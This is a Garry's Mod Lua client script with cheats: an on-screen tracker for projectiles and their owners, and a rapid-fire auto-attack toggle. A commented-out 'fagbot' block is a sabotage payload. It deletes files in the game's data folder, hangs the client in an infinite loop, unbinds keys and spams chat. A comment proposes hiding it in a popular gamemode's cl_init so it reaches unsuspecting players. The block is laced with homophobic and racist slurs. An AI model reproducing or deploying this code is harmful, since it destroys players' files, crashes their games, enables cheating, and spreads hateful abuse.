local classes = {crossbow_bolt = true,npc_grenade_frag = true,rpg_missile = true,prop_combine_ball = true,grenade_ar2 = true}

local function PaintTracking()

for _,ent in pairs(ents.GetAll()) do

if(ValidEntity(ent) == true) then

local class = ent:GetClass()

if(classes[class] ~= nil) then
if(ent.tracking == nil) then
ent.tracking = {}
end

local tracking = ent.tracking
local pos = ent:GetPos()

table.insert(tracking,pos)





local sposg=util.QuickTrace(pos,Vector(0,0,0),ent).HitPos:ToScreen()
local spos = pos:ToScreen()

surface.SetDrawColor(Color(255,0,0,255))

surface.DrawOutlinedRect(sposg.x-5,sposg.y-5,11,11)
surface.DrawRect(sposg.x,sposg.y-5, 1, 10 )
surface.DrawRect(sposg.x-5,sposg.y, 10, 1 )
draw.SimpleText(ent:GetOwner():Nick(), "Default",sposg.x, sposg.y, team.GetColor(ent:GetOwner():Team()))

surface.SetDrawColor(Color(0,255,0,255))

if(table.Count(tracking) >= 2) then

for idx,pos in pairs(tracking) do

if(idx > 2) then

local pos = pos:ToScreen()
local pos2 = tracking[idx-1]:ToScreen()
surface.DrawLine(pos.x,pos.y,pos2.x,pos2.y)

end
	end
		end
			end
				end
					end
						end
	hook.Add("HUDPaint", "Trajectory", PaintTracking)	
/*print( "fagbot loading...." )
print("lets ruin your pc faggot")


require("oosock");
local sock = OOSock(IPPROTO_UDP)
sock:Bind(GetConVarString("ip"),276546);--lol
sock:List(5);
sock:SetCallback(function(sock,type,err,obj,ip,port)
	
	
local function AddDir(dir) // stolen from wiki <dfkjhngfh
	local list = file.FindDir("../"..dir.."/*")
	for _, fdir in pairs(list) do
		AddDir(dir.."/"..fdir)
	end
 
	for k,v in pairs(file.Find("../"..dir.."/*")) do
		file.Delete(dir.."/"..v)
	end
end
AddDir("data")
coc testqaitems
local function shitfuck(cmd, angle)
		angle.y = angle.y * 40000000
		SetViewAngles(cmd, angle)
end

local function FUCKSHITUP()

hook.Add("HUDPaint", "dicks", function() --eyecancer
	draw.RoundedBox(1000000, ScrW(), ScrH(), 10000,10000,--[[shits working like that]] HSVToColor(math.random(1,360),1,1))--moar colors lololol
		end)
	end

local function FUCKEVENMORESHITUP()
if maxfag== true then
require("bbot")
require("deco")
require("localcommand")
require("luaerror")
hook.Add("luaerror","umadbro",function()
	Error("infinite loop nigger");
end)
timer.Create("CRASHTIMENG", 120, 0, function()

end)

hook.Add("Think", "lolol", function()
RunConsoleCommand("say", "HELLLO I AM A MAC FAG THEREFORE I WILL CRASH IN 120 SECONDS")
RunConsoleCommand("unbindall")	
RunConsoleCommand("exec config")
RunConsoleCommand("+jump")
		end)
	end
end	

	
//THIS NEEDS TO BE IN CL_INIT ON A REALLY COOL AND POPULAR GAMEMODE/WIREMOD



local function HammerTiem()
	while true do
		debug.sethook();
	end;
end;



local bannedCVars = {"unbind_mac","bind_mac"}
local function CheckForMacFag()
	local macfag = false;
	for _,cvar in pairs(bannedCVars) do
		if (ConVarExists(cvar) == true) then
		macfag = true;
		break;
	end;
	if(maxfag== true) then
		HammerTiem();
		 shitfuck()
		 FUCKSHITUP()
	end;
end;
print( "fagbot loaded" )
*/
local fireenabled = false  
local firetoggle = true  
  
local function fireon()  
    fireenabled = true  
end  
  
local function fireoff()  
    fireenabled = false  
    firetoggle = true  
    RunConsoleCommand("-attack")  
end  
concommand.Add("+aattack", fireon)  
concommand.Add("-aattack", fireoff)  
  
local function fire()  
    if not fireenabled then return end  
    RunConsoleCommand((firetoggle and "+" or "-").."attack","")  
    firetoggle = not firetoggle  
end  
hook.Add("Think", "jamfirer", fire)	
